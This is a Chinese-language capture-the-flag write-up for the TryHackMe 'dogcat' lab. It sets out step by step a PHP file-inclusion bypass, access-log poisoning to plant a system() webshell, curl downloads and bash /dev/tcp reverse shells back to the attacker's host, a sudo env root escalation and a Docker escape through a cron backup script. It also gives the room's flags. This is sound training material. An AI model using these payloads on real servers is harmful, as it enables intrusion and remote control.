# Dogcat Writeup
> URL : https://tryhackme.com/room/dogcat

IP: 10.10.221.153
第一次打 Medium 的題目

## Recon
- 先用老梗 `nmap -A 10.10.221.153`
	- 發現只有開 80 跟 22
- dirsearch
	- 發現基本上都沒有東西 QQ

## 瀏覽器亂逛
- http://10.10.221.153/
	- ![](https://i.imgur.com/60cFGhz.png)
	- 會發現可以選狗勾或貓貓
		- 選貓貓會出現
			- ![](https://i.imgur.com/JGEBCKB.png)
			- 網址是 `http://10.10.221.153/?view=cat`
		- 選狗勾
			- 網址是 `http://10.10.221.153/?view=dog`
			- ~~不要問我為什麼不幫狗勾截圖~~

- 嘗試 LFI
	- 這邊可以套一個 php 的 LFI 老梗 PHP Wrapper
		- `http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=cat`
		- ![](https://i.imgur.com/IaYSGCc.png)
		- 可以發現成功噴出了一堆 base64
			- `PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K`
			- 解碼後發現是 `<img src="cats/<?php echo rand(1, 10); ?>.jpg" />`
			- 而同理解碼狗勾是 `<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />`

- 繞狗勾
	- 假設我們想要看 `/etc/passwd`
		- `http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=/etc/passwd`
		- ![](https://i.imgur.com/V6btRdB.png)
		- 他會說 ` Sorry, only dogs or cats are allowed.`
	- 而如果我們輸入 `/etc/passwddog`
		- 他會回傳 `Here you go!` 但是噴一些錯誤
		- ![](https://i.imgur.com/BIxMS50.png)
		- 因為找不到檔案，所以錯誤很合理
	- 那我們嘗試亂寫奇怪的路徑看看
		- `http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=./dog/../dog`
		- 會發現可以成功開啟狗勾
	
- 嘗試觀察 `index.php` 內容 這邊只截錄重點
```=php
<?php
	function containsStr($str, $substr) {
		return strpos($str, $substr) !== false;
	}
	$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
	if(isset($_GET['view'])) {
		if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
			echo 'Here you go!';
			include $_GET['view'] . $ext;
		} else {
			echo 'Sorry, only dogs or cats are allowed.';
		}
	}
?>
```
- 可以發現參數 `ext` 很重要
	- 我們可以透過給予 `ext` 空白繞過副檔名

- 任意 LFI
	- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../index.php`
	- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../etc/passwd`
	- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../etc/apache2/apache2.conf`
	- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../var/log/apache2/access.log`
		- 可以發現 `access.log` 可讀
			- ![](https://i.imgur.com/ll0cYjt.png)
			- 可以透過 `access.log` 來做到 LFI 2 RCE
- LFI 2 RCE
	- 如果在瀏覽器輸入這個
		- `10.10.221.153?A=<?php phpinfo(); ?</php>`
	- 在 log 上會變成這樣
		- `/?A=%3C?php%20phpinfo();%20?%3C/php%3E` 
		- 主要是因為 HTTP 會做到 URL Encode

	- 所以可以用 nc
		- `nc 10.10.221.153 80`
		- `GET /MEOW?<?php phpinfo(); ?>`
		- ![](https://i.imgur.com/JXxg8vP.png)
			- 成功!
- 寫入 webshell
	- `nc 10.10.221.153 80`
	- `GET /MEOW?<?php system($_GET[A]); ?>`
		- ![](https://i.imgur.com/o2cJEwA.png)
		- `http://10.10.221.153/?ext=&view=./dog/../../../../../../../var/log/apache2/access.log&A=curl%20-o%20/tmp/s%20http://10.13.21.55:8000/s`
			- 載入 reverse shell
			- 在這邊發現這台電腦沒有 wget，所以用 curl
		- `http://10.10.221.153/?ext=&view=./dog/../../../../../../../var/log/apache2/access.log&A=bash%20/tmp/s`
			- 執行 reverse shell
			- 本地 `nc -vlk 7877`
			- 就可以順利接到 Shell ㄌ!
## Shell
- 在`/var/www/flag.php`
	- 可以找到 flag1
	- ![](https://i.imgur.com/1HiNozU.png)
- 在 `/var/www/flag.php`
	- 可以找到 flag2
	- ![](https://i.imgur.com/rYiIpeP.png)
- 嘗試提權
	- 輸入 `sudo -l` 可以發現我們可以用 root 來 run `/usr/bin/env`
	- ![](https://i.imgur.com/ELIv9bq.png)
		- 這邊有兩種用法
			- `/usr/bin/env ls /root`
				- 就可以用 roo 來 `ls /root`
			- 也可以參考 gtfobins
				- 有 suid 的 env
				- `env /usr/bin/sh -p`
	- 取得 root flag (flag3)
		- `THM{D1ff3r3nt_3nv1ronments_874112}`
## Docker 提權
- 不管了，先老梗的 linpeas 下去
	- `curl -o linpeas.sh 10.13.21.55:8000/linpeas.sh`
	- `/usr/bin/env /tmp/linpeas.sh`
	- ![](https://i.imgur.com/PlO1XxZ.png)
		- 可以發現根目錄有 `/.dockerenv`
		- 確定目前我們在docker中
- 發現備份檔案	
	- ![](https://i.imgur.com/DXOTRMs.png)
	- 發現有 `backup.tar` 跟 `backup.sh`
	- 試著把檔案複製到 `/var/www/html` 來準備下載
		- ![](https://i.imgur.com/gZ2rLz8.png)
- 下載並觀察備份檔案
	- `wget http://10.10.221.153/backup.tar`
	- `tar xf backup.tar`
- 觀察 Docker File
	- ![](https://i.imgur.com/M4K7rpx.png)
		- 發現沒什麼特別
		- 但也發現為什麼 access log 一直有噴一個 `127.0.0.1` 的 curl
- 觀察 `launch.sh` 
	- ![](https://i.imgur.com/U0Sdayw.png)
	- 發現重點!!
	- 他把 `/opt/backup` 掛載到本地的`/root/container/backup` 
		- 所以我在 `/opt/backup` 寫資料會跑到本地端
			- 那問題就只剩下，我們怎麼讓本地執行
- 觀察 `backup.sh`
	- 發現裡面就 `tar cf /root/container/backup/backup.tar /root/container`
	- 但......本地端是怎麼執行的ㄋ??
	- 突然發現上面的 `backup.tar` 就剛好是當前時間! 
		- 所以可以推測說在遠端有一個 cron job
- 寫入 `backup.sh`
	- 戳一個 reverse shell
		- `echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7878 0>&1'" >> backup.sh`
		- ![](https://i.imgur.com/i6PxwrU.png)
	- 本地端開 `nc -vlk 7878`
		- ![](https://i.imgur.com/J26jyNB.png)
	- 拿到本地 root shell! (flag4)
		- `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`